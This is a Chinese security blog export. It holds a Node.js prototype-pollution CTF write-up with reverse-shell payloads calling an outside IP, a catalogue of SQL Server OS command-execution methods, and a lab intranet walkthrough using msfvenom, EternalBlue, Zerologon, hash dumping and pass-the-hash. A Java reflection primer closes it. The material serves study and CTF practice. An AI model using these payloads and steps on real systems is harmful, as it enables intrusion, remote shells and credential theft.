__tmp2&quot;&#125;\n\n\n此时已成功写入恶意代码，接下来刷新一下界面即可成功反弹shell\nweb340这里的话环境和上关类似，但login.js中的内容略有改动，具体如下\n&#x2F;* GET home page.  *&#x2F;\nrouter.post(&#39;&#x2F;&#39;, require(&#39;body-parser&#39;).json(),function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag&#x3D;&#39;flag_here&#39;;\n  var user &#x3D; new function()&#123;\n    this.userinfo &#x3D; new function()&#123;\n    this.isVIP &#x3D; false;\n    this.isAdmin &#x3D; false;\n    this.isAuthor &#x3D; false;\n    &#125;;\n  &#125;\n  utils.copy(user.userinfo,req.body);\n  if(user.userinfo.isAdmin)&#123;\n   res.end(flag);\n  &#125;else&#123;\n   return res.json(&#123;ret_code: 2, ret_msg: &#39;登录失败&#39;&#125;);\n  &#125;\n\n\n&#125;);\n\n改动点在于utils.copy(user.userinfo,req.body);，原本是user的，所以说也就是原型链多了一层，我们再套一层即可，本来的原型链应该是\nuser.__proto__-&gt;Object.__proto__\n\n现在变成了\nuser.userinfo__proto-&gt;user.__proto__-&gt;Object.__proto__\n\n因此我们这里在上一关的payload基础上多加一个__proto__即可，具体payload如下\n&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;IP地址&#x2F;监听端口 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125;\n\n而后POST发包访问/api接口查看是否成功反弹shell\nweb341这里缺少了api.js，这样的话就说明没法再去用之前的方法来做了，但考虑到这里的ejs模板，所以这里的话应该是用ejs来进行反弹shell的，尝试用此payload进行反弹shell，与之前payload相似，多套一层__proto__，具体payload如下\n&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.255.142&#x2F;7777 0&gt;&amp;1\\&quot;&#39;);var __tmp2&quot;&#125;\n&#125;&#125;\n\n而后刷新一下界面，以此来执行我们的恶意代码，接下来查看VPS是否成功反弹shell这里的话flag没有在这里，需要我们自己找一下\nfind &#x2F; |grep flag\ncat &#x2F;flag\n\n\nWeb342jade的原型链污染，参考链接https://xz.aliyun.com/t/7025，由于node.js了解较少，所以这里参考其他师傅的payload进行尝试，等学会node.js再对具体代码进行分析，payload如下\n&#123;&quot;__proto__&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;type&quot;:&quot;Code&quot;,&quot;self&quot;:1,&quot;line&quot;:&quot;global.process.mainModule.require(&#39;child_process&#39;).execSync(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.255.142&#x2F;7777 0&gt;&amp;1\\&quot;&#39;)&quot;&#125;&#125;&#125;\n\n接下来刷新界面，查看监vps成功反弹shell，接下来查看flag即可\nWeb343说是增加了过滤，但仍沿用上一关payload，亦可打通\nWeb344源码如下\nrouter.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;\n  res.type(&#39;html&#39;);\n  var flag &#x3D; &#39;flag_here&#39;;\n  if(req.url.match(&#x2F;8c|2c|\\,&#x2F;ig))&#123;\n  \tres.end(&#39;where is flag :)&#39;);\n  &#125;\n  var query &#x3D; JSON.parse(req.query.query);\n  if(query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;&amp;&amp;query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;&amp;&amp;query.isVIP&#x3D;&#x3D;&#x3D;true)&#123;\n  \tres.end(flag);\n  &#125;else&#123;\n  \tres.end(&#39;where is flag. :)&#39;);\n  &#125;\n\n&#125;);\n\n可以看到我们这里需要满足三个条件\n1、query.name&#x3D;&#x3D;&#x3D;&#39;admin&#39;\n2、query.password&#x3D;&#x3D;&#x3D;&#39;ctfshow&#39;\n3、query.isVIP&#x3D;&#x3D;&#x3D;true\n\n我们这里平常的话如果没有过滤的话，直接这样写payload就可以\nquery&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;ctfshow&quot;,&quot;isVIP&quot;:true&#125;\n\n但这里存在过滤(req.url.match(/8c|2c|\\,/ig))，%2c是,，所以我们这里不能再用逗号，我们这里可以使用&amp;&amp;来代替它，但此时发现还不行，这是因为:&quot;ctfshow这里，这个&quot;的编码是%22，而它和c连起来，此时就是%22c，此时就有2c了，所以不满足条件，因此我们这里需要对c进行一次URL编码，所以最终payload是\nquery&#x3D;&#123;&quot;name&quot;:&quot;admin&quot;&amp;query&#x3D;&quot;password&quot;:&quot;%63tfshow&quot;&amp;query&#x3D;&quot;isVIP&quot;:true&#125;\n\n参考文章https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x02-javascripthttps://xz.aliyun.com/t/7182#toc-7https://blog.csdn.net/miuzzx/article/details/111780832https://xz.aliyun.com/t/7184#toc-11\n","slug":"浅析CTF中的Node.js原型链污染","date":"2023-02-18T16:14:20.000Z","categories_index":"WEB知识","tags_index":"Node.js","author_index":"quan9i"},{"id":"ad74bb09d7e0c77ac4f85f8bb423fecf","title":"SQL Server命令执行方式汇总","content":"前言学习内网基础时发现对Mssql的命令执行不太熟悉，因此进行了简单总结，希望对正在学习此类知识的师傅有所帮助。\n环境搭建本文环境如下\n服务器：windows2008\n数据库：sqlserver2008\n下载链接如下（复制后打开迅雷即可自动加载）\ned2k://|file|cn_windows_server_2008_r2_hpc_x64_dvd_552764.iso|2959194112|1941C1937261AB4F6F9A28F86FE3DAC0|/\ned2k://|file|cn_sql_server_2008_r2_developer_x86_x64_ia64_dvd_522724.iso|4662884352|E436F05BCB0165FDF7E5E61862AB6BE1|/\n首先安装windows2008，然后将sqlserver的镜像导入，导入方式可采用添加CD/DVD来实现，也可直接将iso文件拖入而后打开进行安装即可，具体教程可参考macchiato大师傅的这篇文章MSSQL注入环境搭建安装完成后Navicat进行连接此时就可以打开数据库，在其中执行命令查询来进行测试了。\n命令执行扩展存储过程（xp_cmdshell）概念什么是xp_cmdshell呢，这里的话简单介绍一下\nxp_cmdshell是Sql Server中的一个组件，我们可以用它来执行系统命令。\n其作用就是执行命令，xp_cmdshell可以让系统管理员以操作系统命令行解释器的方式执行给定的命令字符串，并以文本行方式返回任何输出。\n补充\n\n\n\n\n\n\n\n\n\n以xp_开头，使用外部程序语言编写的存储过程为扩展存储过程。如：xp_cmdshell\n利用条件\n\n\n\n\n\n\n\n\n1 、SQL Server数据库没有被降权；2、 sa用户或其他具有dba权限的账户。\n具体利用直接使用指令的话应该执行这条语句\nexec master..xp_cmdshell \"whoami\"\n但此时执行的话是执行不了的，这是因为他默认是关闭的，我们需要首先开启xp_cmdshell，执行一段语句即可，具体指令如下\nEXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;\n接下来再去执行指令即可出现回显。\n但也存在一种情况，即xp_cmdshell被删除的情况，此时，我们可以通过以下语句来进行恢复\nExec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\\\xplog70.dll'\n系统存储过程(sp_OACreate)概念\n\n\n\n\n\n\n\n\nsp_OACreate 创建 OLE 对象实例。–&gt;第一个参数为 OLE 对象的程序标识符（ProgID）或类标识符（CLSID）。–&gt;第二个参数为返回的对象令牌，必须是数据类型为 int 的局部变量，在后面的方法中都要用到对象令牌。输出参数，必须加 OUT 或 OUTPUT。\n当xp_cmdshell无法使用时，我们也可以通过sp_OACreate来创建OLE对象实例，然后利用sp_oamethod(sp_oamethod是调用一个 OLE 对象的方法)达到一个执行命令的效果。\n补充\n\n\n\n\n\n\n\n\n\n以sp_开头，进行系统的设定为系统存储过程。如：sp_oacreate、sp_oamethod\n利用条件同上，即\n\n\n\n\n\n\n\n\n\n1 、SQL Server数据库没有被降权；2、 sa用户或其他具有dba权限的账户。\n具体利用首先判断一下sp_OACreate是否存在\nselect count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE'\n回显1即代表存在，接下来就可以去启用它而后执行命令。这里采用EXEC来开启它，具体指令如下\nEXEC sp_configure 'show advanced options', 1;   \nRECONFIGURE WITH OVERRIDE;   \nEXEC sp_configure 'Ole Automation Procedures', 1;   \nRECONFIGURE WITH OVERRIDE;\n开启后我们就可以执行命令了，因为这个命令是无回显的，所以我们需要将结果导出至一个文本中，具体指令如下\ndeclare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami >c:\\\\1.txt'\n可以看到此时成功执行命令并看到了查询结果。\n本地存储过程(CLR）概念CLR，即Common Language Infrastructure，其含义为公共语言基础结构，它用来支持不同编程语言。sql server集成了该组件，可以通过sql server编写CLR来执行系统命令。\n补充\n\n\n\n\n\n\n\n\n\n本地存储过程指用户创建的自定义存储过程。如：CLR\n利用条件\n\n\n\n\n\n\n\n\n1、在SQL Server上能启用CLR并可以创建自定义存储过程2、SQL Server当前账号具有执行命令/代码所需要的权限\nCLR编写这里先膜拜一下Y4er大师傅，编写过程参考自这位大师傅。这里使用的是visual studio 2022，在创建新项目中选择SQL Server数据库项目而后点击下一步，接下来随便填写一下，创建项目即可。而后右键项目点击属性接下来选择目标平台并创建脚本接下来点击左侧的SQLCLR，修改目标框架为3.5版本，修改权限级别为UNSAFE保存后再右键右边的添加，选择存储过程而后选择SQL CLR C# 存储过程而后写入如下代码\nusing System;\nusing System.Data;\nusing System.Data.SqlClient;\nusing System.Data.SqlTypes;\nusing System.Diagnostics;\nusing System.Text;\nusing Microsoft.SqlServer.Server;\n\npublic partial class StoredProcedures\n&#123;\n    [Microsoft.SqlServer.Server.SqlProcedure]\n    public static void ExecCommand (string cmd)\n    &#123;\n        // 在此处放置代码\n        SqlContext.Pipe.Send(\"Command is running, please wait.\");\n        SqlContext.Pipe.Send(RunCommand(\"cmd.exe\", \" /c \" + cmd));\n    &#125;\n    public static string RunCommand(string filename,string arguments)\n    &#123;\n        var process = new Process();\n\n        process.StartInfo.FileName = filename;\n        if (!string.IsNullOrEmpty(arguments))\n        &#123;\n            process.StartInfo.Arguments = arguments;\n        &#125;\n\n        process.StartInfo.CreateNoWindow = true;\n        process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;\n        process.StartInfo.UseShellExecute = false;\n\n        process.StartInfo.RedirectStandardError = true;\n        process.StartInfo.RedirectStandardOutput = true;\n        var stdOutput = new StringBuilder();\n        process.OutputDataReceived += (sender, args) => stdOutput.AppendLine(args.Data);\n        string stdError = null;\n        try\n        &#123;\n            process.Start();\n            process.BeginOutputReadLine();\n            stdError = process.StandardError.ReadToEnd();\n            process.WaitForExit();\n        &#125;\n        catch (Exception e)\n        &#123;\n            SqlContext.Pipe.Send(e.Message);\n        &#125;\n\n        if (process.ExitCode == 0)\n        &#123;\n            SqlContext.Pipe.Send(stdOutput.ToString());\n        &#125;\n        else\n        &#123;\n            var message = new StringBuilder();\n\n            if (!string.IsNullOrEmpty(stdError))\n            &#123;\n                message.AppendLine(stdError);\n            &#125;\n\n            if (stdOutput.Length != 0)\n            &#123;\n                message.AppendLine(\"Std output:\");\n                message.AppendLine(stdOutput.ToString());\n            &#125;\n            SqlContext.Pipe.Send(filename + arguments + \" finished with exit code = \" + process.ExitCode + \": \" + message);\n        &#125;\n        return stdOutput.ToString();\n    &#125;\n&#125;\n\n编译后，即可导入程序集并且创建执行命令存储过程的sql语句。（正常的话我们此时就可以得到一个dll文件，而后直接导入到程序集中，但我这里并未成功编译，期间遇见了一些报错也未能解决，所以后续采用Y4er大师傅的字节流导入的方式来进行CLR的利用）\n具体利用首先我们需要开启CLR(默认关闭)，具体代码如下所示\nsp_configure 'clr enabled', 1\nGO\nRECONFIGURE\nGO\n然后我们这里导入的程序集的话是从外部导入的，默认是不安全的，所以我们需要执行语句来使得这个程序集被标注为安全的，具体代码如下\nALTER DATABASE master SET TRUSTWORTHY ON;\n接下来我们就可以导入我们的程序集了，我们这里采用字节流的方式进行导入\nCREATE ASSEMBLY [quq]\n    AUTHORIZATION [dbo]\n    FROM n    WITH PERMISSION_SET = UNSAFE;\ngo\n\n然后创建存储过程\nCREATE PROCEDURE [dbo].[ExecCommand]\n@cmd NVARCHAR (MAX)\nAS EXTERNAL NAME [quq].[StoredProcedures].[ExecCommand]\ngo\n接下来就可以去执行命令\n扩展（SharpSQLTools）有大师傅开发了针对mssql CLR进行利用的渗透工具，工具链接如下https://github.com/uknowsec/SharpSQLTools可以进行下载(上传)文件、反弹shell、提权，cs上线等操作。\n这里采用CLR提权，只需三步即可\nSharpSQLTools.exe 10.10.10.18 sa sa master install_clr\nSharpSQLTools.exe 10.10.10.18 sa sa master enable_clr\nSharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato whoami\n\n\n\n\n\n\n\n\n\n\n\n注：图片来自本人打的某个内网靶机，有兴趣的师傅可以去看看https://xz.aliyun.com/t/11588#toc-0\n同时，也有师傅对此进行了二开改写，写出了SharpSQLToolsGUI工具，工具链接如下https://github.com/RowTeam/SharpSQLTools通过这个GUI工具，可以更直观的看到文件界面，上传和下载文件更快速简洁一些，当我们将Cs生成的马上线到可写目录后，再去执行此文件，即可实现Cs上线\nPowerUpSQL这个是针对Mssql进行攻击的一个强大工具，工具链接如下https://github.com/NetSPI/PowerUpSQL这里介绍几种常用的方式，更多的方法可参考https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet\nSP_Addextendedproc这个主要是使用了套件中的Create-SQLFileXpDll方法，它的大概思想就是创建一个dll文件，然后我们通过执行dll文件将内容写到一个文件中从而达到一个命令执行的效果，其方法具体为以下几步\n首先我们需要创建dll文件\nPS E:\\工具\\PowerUpSQL-master\\PowerUpSQL-master> . .\\PowerUpSQL.ps1\nPS E:\\工具\\PowerUpSQL-master\\PowerUpSQL-master> Create-SQLFileXpDll -OutFile D:\\exec.dll -Command \"echo Exec test > C:\\test.txt\" -ExportName xp_test\n接下来我们需要去导入并调用dll文件，SQL Server 通过 sp_addextendedproc 调用DLL从而达到命令执行的效果。这里有两种方式导入：\n//via local disk\nsp_addextendedproc 'xp_test', 'D:\\exec.dll'\n//via UNC path:\nsp_addextendedproc 'xp_test', '\\\\servername\\pathtofile\\exec.dll'\n\n导入后，接下来就可以调用xp_test来执行命令\nexec master..xp_test\n\n正常情况应该是这样但我这里并未在C盘出现文件，可能是因为当前登录用户为普通用户，在C盘没有可写权限。\nAgent Job执行命令概念MSSQL Server代理是一个Windows服务，它可以被用来执行自动化任务。管理员可以设置定时代理作业，然后在SQL Server代理服务中执行这些定时作业。所以这个的话我们首先需要开启一个代理\n利用条件\n\n\n\n\n\n\n\n\n1、开启了MSSQL Agent Job服务2、有权限新建和执行agent jobs的权利\n具体利用具体执行命令的代码如下所示\nUSE msdb; \nEXEC dbo.sp_add_job @job_name = N'test_powershell_job3'; \nEXEC sp_add_jobstep @job_name = N'test_powershell_job3', @step_name = N'test_powershell_name3', @subsystem = N'PowerShell', @command = N'c:\\windows\\system32\\cmd.exe /c whoami /all >c:\\\\123.txt', @retry_attempts = 1, @retry_interval = 5 ;\nEXEC dbo.sp_add_jobserver @job_name = N'test_powershell_job3'; \nEXEC dbo.sp_start_job N'test_powershell_job3';\n接下来我们去主机中查看是否存在文件成功执行命令\nsandbox概念沙盒模式是一种安全功能。在沙盒模式下，Access 只对控件和字段属性中的安全且不含恶意代码的表达式求值。如果表达式不使用可能以某种方式损坏数据的函数或属性，则可认为它是安全的。沙盒提权的核心就是对注册表的操作，依赖xp_regwrite存储过程对注册表修改，且服务器拥有 jet.oledb.4.0 驱动。\n利用条件\n\n\n\n\n\n\n\n\n1、SA权限\n具体利用首先需要激活沙盒模式win2003的激活方式\nexec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0;--\nwin2008的激活方式\nexec master..xp_regwrite 'HKEY_LOCAL_MACHINE','SOFTWARE\\Wow6432Node\\Microsoft\\Jet\\4.0\\Engines','SandBoxMode','REG_DWORD',0; \n\n接下来执行命令即可win2003的执行命令方式\nselect * From OpenRowSet('Microsoft.Jet.OLEDB.4.0',';Database=c:\\windows\\system32\\ias\\ias.mdb','select shell(\"net user >c:\\test.txt \")');\nWindows 2008 R2 默认无Access数据库文件,需要自己上传,或者用UNC路径加载文件方能执行命令。\nselect * from openrowset('microsoft.jet.oledb.4.0',';database=\\\\xxx.xxx.xxx.xxx\\ias.mdb','select shell(\"c:\\windows\\system32\\cmd.exe /c net user  >c:\\test.txt \")');\n但是,当 X:\\Windows\\System32\\ias\\dnary.mdb 或 X:\\Windows\\System32\\ias\\ias.mdb 被删除时,命令就会无效，所以常见的方式是创建一个数据库,然后再利用jet.oledb调用SysSetup.xml执行系统命令创建数据库代码如下\ndeclare @hr int;\ndeclare @object int;declare @property int;\nexec @hr = sp_OACreate 'ADOX.Catalog',@object OUTPUT;\nexec @hr = sp_OAMethod @object,'Create',@property output,'Provider=Microsoft.Jet.OLEDB.4.0;Data Source=SysSetup.xml';\n执行命令代码如下\nselect * from openrowset('microsoft.jet.oledb.4.0',';database=SysSetup.xml','select shell(\"cmd.exe /c CMD命令\")')\nR和Python脚本概念SQL Server 2017加入了Microsoft机器学习服务，该服务允许通过SQL Server中sp_execute_external_script执行Python和R脚本\n利用条件1、Machine Learning Services必须要在Python安装过程中选择\n2、必须启用外部脚本\n3、用户拥有执行任何外部脚本权限\n具体利用R脚本执行命令\nsp_configure 'external scripts enabled'\nGO\nEXEC sp_execute_external_script @language=N'R',@script=N'OutputDataSet &lt;- data.frame(system(\"cmd.exe /c dir\",intern=T))'\nWITH RESULT SETS (([cmd_out] text));\nGO\nPython脚本执行命令\nexec sp_execute_external_script \n@language =N'Python',\n@script=N'import subprocess\np = subprocess.Popen(\"cmd.exe /c whoami\", stdout=subprocess.PIPE)\nOutputDataSet = pandas.DataFrame([str(p.stdout.read(), \"utf-8\")])'\nWITH RESULT SETS (([cmd_out] nvarchar(max)))\n\n参考链接https://xz.aliyun.com/t/7534#toc-18https://www.freebuf.com/articles/system/267618.htmlhttps://evi1cg.me/archives/Exec_OS_Command_Via_MSSQL.htmlhttps://y4er.com/posts/mssql-execute-command-with-clr-assemblies/#%E5%8F%82%E8%80%83https://www.freebuf.com/articles/web/332407.htmlhttps://blog.51cto.com/ro535/1764334\n","slug":"SQL Server命令执行方式汇总","date":"2023-02-11T15:51:20.000Z","categories_index":"渗透","tags_index":"内网","author_index":"quan9i"},{"id":"9fd6beee5792c51d9bc8310e5aab4662","title":"内网靶场初探","content":"前言内容写的很乱，因为第一次搞，有点不太熟练，所以各位师傅简单看看就好，写的比较好的文章，可以参考这两个https://xz.aliyun.com/t/11588#toc-0https://mp.weixin.qq.com\n环境搭建https://pan.baidu.com/s/1DOaDrsDsB2aW0sHSO_-fZQ\n提取码: vbi2\n拓扑图如下具体我这里使用的攻击机和外网ip\nkali:192.168.10.129\nwin2012:192.168.1\n对于这些ip，我们只需要多设置几个网段就好，具体是在编辑中的虚拟网络编辑器\n而后在各个机子的设置中使用这些网段就好\n外网假设我们这里已知了外网的ip为192.168.10.128，接下来我们用namp进行扫描，简单查看一下开放端口\nnmap.exe -p1-65535 -Pn -A -T4 192.168.10.128\n//这个命令行指令是使用nmap工具（nmap.exe）扫描IP地址为192.168.10.22的设备，扫描端口范围为\n1-65535，使用-Pn选项表示不进行主机发现，使用-A选项表示进行操作系统指纹识别，使用-T4选项表示\n扫描速度为最快。\n这里扫描到7001端口开放，为WebLogic服务这里使用脚本扫描一下，看是否存在漏洞，脚本链接如下https://github.com/rabbitmask/WeblogicScan可以发现这里存在多个CVE漏洞，接下来我们使用注入工具尝试打一下，工具链接https://github.com/sp4zcmd/WeblogicExploit-GUI/releases/tag/WeblogicExploit-GUI使用第一个CVE漏洞进行尝试，即CVE-2016-0638成功执行命令，接下来尝试注入内存马使用冰蝎进行连接成功连接，拿到主机权限。执行net time /domain查看是否在域内不在域内，这个大概率是DMZ的机器，这里简单提一下DMZ\n\n\n\n\n\n\n\n\n\n英文全名“Demilitarized Zone”，中文含义是“隔离区”。在安全领域的具体含义是“内外网防火墙之间的区域”。\n这里的话我们的权限是管理员权限，所以不用再进行权限提升，这里开始进行信息搜集，首先查看一下是否存在杀软，指令如下\ntasklist\n//Tasklist命令是一个用来显示运行在本地或远程计算机上的所有进程的命令行工具\n常见的杀软程序名字可以参考这里https://github.com/wwl012345/AVCheck/blob/main/杀软识别.txt这里的话可以看出不存在杀软，接下来进行msf上线，这里有两种方法\n1、使用msfvenom生成木马文件\n2、使用powercat进行反弹shell\n法一首先我们在kali中生成木马\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.10.129 LPORT=7777 -f exe > shell3.exe \n\n接下来将shell3.exe移到靶机中而后在kali中执行如下指令\nmsfconsole  //进入框架\nuse exploit/multi/handler                      //载入模块\nset payload windows/meterpreter/reverse_tcp    //加载攻击负载核\nset lhost 192.168.10.129                   //设置本地监听地址，和生成的木马地址一致\nset lport 7777                          //设置本地监听端口，和生成的木马地址一致\nrun                            //开始执行，等待目标上线\n接下来在靶机中执行木马文件而后按理说在kali中查看即可上线，但我的是回显 Meterpreter session 1 closed.  Reason: Died，百度这个后得知可能的几个原因是\n1、msf版本不兼容\n2、payload不匹配\n3、存在杀软\n生成木马和监听，payload都是windows/meterpreter/reverse_tcp，所以感觉应该不存在问题，杀软这个之前也已经检测过，不存在杀软，所以这里的话由于认知浅薄，技术过菜，这种方式没能继续下去，这里我换了一种方式来进行反弹shell\n法二打开kali，指令如下\nmsfconsole  //进入框架\nuse exploit/multi/script/web_delivery //载入模块\nset srvhost 192.168.10.129\nset srvport 8080\nset lhost 192.168.10.129\nset lport 7777\n//options\n//show targets\nset target 2\nset payload windows/x64/meterpreter/reverse_tcp //set target 2是设置了powershell（psh）模块\nexploit -j\n接下来将powershell.exe这些代码进行复制，复制到冰蝎中执行此时在kali攻击机中输入jobs可以发现此时就有会话了，我们进入会话\nsession 2\n成功上线\n上线后查看一下自动登录的密码\nrun windows/gather/credentials/windows_autologin\nhashdump //导出密码\n\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:ccef208c6485269c20db2cad21734fe7:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nmd5解密接下来查看网络信息\nrun get_local_subnets \n发现有两个网段，上传fscan，用它扫一下内网网段\nfscan64.exe -h 10.10.20.0/24 > result.txt\n\nwin7发现新的机器10.10.20.7,同时扫出此机器疑似存在MS17-010漏洞接下来添加新路由\nmeterpreter > run autoroute -s 10.10.20.0/24 //添加路由\nmeterpreter > run autoroute -p //查看路由是否添加成功\n\n接下来探测一下是否存在ms17-010漏洞指令如下\nsearch ms17-010\nuse 1\nset RHOSTS 10.10.20.7\nrun\n\n然后这里会发现确实存在漏洞\n接下来就去利用这个漏洞获取权限\nuse 2\nset payload windows/x64/meterpreter/bind_tcp\nset rhost 10.10.20.7\nset lport 11111\nrun\n执行sessions -l发现直接就是system权限，无需提权，接下来用mimikatz抓一下密码，指令如下\nload mimikatz\ncreds_all\n换用其他方式抓取密码\nhashdump\nrun windows/gather/smart_hashdump\nrun windows/gather/credentials/windows_autologin\n发现另一组用户john:admin!@#45接下来去打mssql，用SharpSQLTools.exe而后cs利用中转生成木马，通过GUI工具上传到可写目录，接下来去执行即可上线cs\n而后再利用sharpSQLTools进行权限提升，即可拿下mssql这个\nSharpSQLTools.exe 10.10.10.18 sa sa master install_clr\nSharpSQLTools.exe 10.10.10.18 sa sa master enable_clr\nSharpSQLTools.exe 10.10.10.18 sa sa master clr_efspotato whoami\n\n\n最后一个域控的话，这里可以参考这篇文章https://www.freebuf.com/articles/system/288515.html我们这里首先验证漏洞是否存在，具体脚本看https://github.com/SecuraBV/CVE-2020-1472回显Success，说明存在漏洞，接下来去重置域账号脚本参考https://github.com/dirkjanm/CVE-2020-1472\n\n\n\n\n\n\n\n\n\n但要先安装要安装impacket(https://github.com/SecureAuthCorp/impacket)安装方法：python -m pip install \n而后读取域控中的hash\npython secretsdump.py redteam.red/OWA$@10.10.10.8 -just-dc -no-pass\n接下来有了hash，我们用wmiexec.py进行登录\npython wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:028b70314013e1372797cff51298880e redteam.red/administrator@10.10.10.8 -codec gbk\n\n成功拿到权限\n后言这个靶场Mssql那个机子有问题，怎么打都打不进去，msf执行语句无法上线使用proxifier+SharpSQLToolsGUI上传cs的木马文件后也无法上线所以最终cs也是没能成功上线，只上线了两台机子不过也学到了很多东西，比如ew代理，frp内网穿透，这里再说一下我cs上线的时候，是如何通过win2012打win7的，拿下win2012后，我们在攻击机中设置frps，frps.ini内容如下\n[common]\nbind_addr =0.0.0.0\nbind_port = 7000\n\n然后我们在受害机，也就是win2012中配置frpc，frpc.ini内容如下\n[common]\nserver_addr = 192.168.10.129\nserver_port = 7000\n[plugin_socks]\ntype = tcp\nremote_port = 7777\nplugin = socks5\n\n然后执行frpc回显success，此时代理就完成了，攻击机就相当于win2012了，接下来在攻击机用msf打就好了\n\nmsf6 > setg Proxies socks5:192.168.0.175:7777\nmsf6 > setg ReverseAllowProxy true\nmsf6 > use exploit/windows/smb/ms17_010_eternalblue\nmsf6 > set payload windows/x64/meterpreter/bind_tcp\nmsf6 > set rhost 10.10.20.7\nmsf6 > run\n然后还有cs的使用，cs的话首先需要kali开启teamserver\n然后再打开cs，ip对应，密码123456即可连接\n","slug":"内网靶场初探","date":"2023-02-07T16:19:20.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"8bd1f2733cc5f9b409baa8184367dcbe","title":"JAVA安全基础入门篇","content":"声明文章首发于先知社区https://xz.aliyun.com/t/13284\nJAVA 反射定义什么是JAVA 反射。接下来引用一下Y4tacker大师傅的话\nJava反射机制是在运行状态时，对于任意一个类，都能够获取到这个类的所有属性和方法，对于任意一个对象，都能够调用它的任意一个方法和属性(包括私有的方法和属性)，这种动态获取的信息以及动态调用对象的方法的功能就称为java语言的反射机制。\n简单的说，就是通过java反射机制，我们可以获取任意类的成员方法、变量这些，同时，可以创建JAVA类实例，调用任意类方法。\n还有就是想说一下这里为什么称为反射，在JAVA中，我们可以这样理解：通过new一个对象而调用其中方法的，称为”正射”，而不通过new一个对象取得其中方法的，称为”反射”。\n学前必备小知识反射的动态机制反射机制是java实现动态语言的关键，也就是通过反射机制实现类动态加载\n1、静态加载：编译时加载相关的类，如果没有就报错，依赖性过强\n2、动态加载：运行时加载需要的类，如果运行时不使用该类，即使不存在也不会报错，降低了依赖性。\n示例如下\nimport java.util.*;\nimport java.lang.reflect.*;\npublic class Main&#123;\n    public static void main(String[] args) throws Exception&#123;\n        Scanner Scanner = new Scanner(System.in);\n        System.out.println(\"请输入key\");\n        String key = Scanner.next();\n        switch (key)&#123;\n            case \"1\":\n                Dog dog = new dog();\n                dog.cry();\n                break;\n            case \"2\":\n                Class cls = Class.forName(\"Person\");\n                Object o = cls.newInstance();\n                Method m = o.getMethod(\"hi\");\n                m.invoke(o);\n                break;\n        &#125;\n    &#125;\n&#125;\n\n此时去运行javac Main.java会发现无法编译成功，因为dog类已经是静态加载机制，这个需要提前加载，而这里没有，故报错，而如果有Dog类，即使没有Person类，编译也不会报错，会正常生成class文件，但当运行时会报错。\n常用方法forName()forName方法可以获取类中的所有属性包括类名。\n示例如下\nClass.forName(classname): 获取classname类中的所有属性\nClass qwq = Class.forName(\"java.lang.Runtime\");\n//获取Runtime类中的所有属性，并赋值给clazz类\n\nnewInstance()书接上文，我们在示例中将Runtime类中的所有属性赋值给了qwq类，接下来我们想要调用qwq类中的某个方法的话，需要三步\n1、对类进行实例化(实例化对象)\n2、获取方法\n3、执行方法\n\n接下来分步进行。\n第一步，是实例化对象，此时也就引入了我们的**newInstance()**方法..\n对该方法进行简单解释，此方法可以实例化对象，并触发类的构造方法，所以此时的话对象就创建完成了，接下来就是获取方法了。\ngetMethod()我们在获取完对象后，对对象中的Public方法获取的方式是采用*getMethod()*函数，这个函数的具体参数如下\ngetMethod(\"方法名，参数类型(如String.class)\")\n\n此时就可以获取到方法了，接下来我们只需要进行执行方法即可，此时也就引入了我们的最后一个函数。\ninvolve()involve可以执行方法，如果是一个普通方法，则involve的第一个参数为该方法所在的对象，如果是静态方法则第一个参数是Null或者该方法所在的类，第二个参数为要执行方法的参数。\n上述只是一些常见的方法，并不是全部的，比如获取类的方法，不止有forName函数，接下来开始进一步讲解。\n获取类JAVA反射操作的是java.lang.Class对象，上文中提到过Class对象，在类被编译加载时，它会存储类的相关信息，所以我们这里需要首先获取到类。上述说了一个方法，forName方法，它并不是唯一的方法，还有两种常用的方法，具体如下\n1、getClass(): 当上下文中存在某个类的实例化对象，我们可以通getClass()方法直接获取它的类，示例如下:\nString s = \"qwq\";\nClass cla = s.getclass();\n\n2、类名.class: 如果已经加载了一个类，我们知道类中的一个静态变量或是其他，此时便可直接获取，示例如下:\nClass cla = String.class\n\n对于forName方法，获取类的方式如下\n3、Class.forName(\"完整类名\")，当我们知道一个类的完整类名时，可以通过静态方法Class.forName()获取\nClass cla = Class.forName(\"java.lang.String\") \n//获取java.lang.String的全部方法 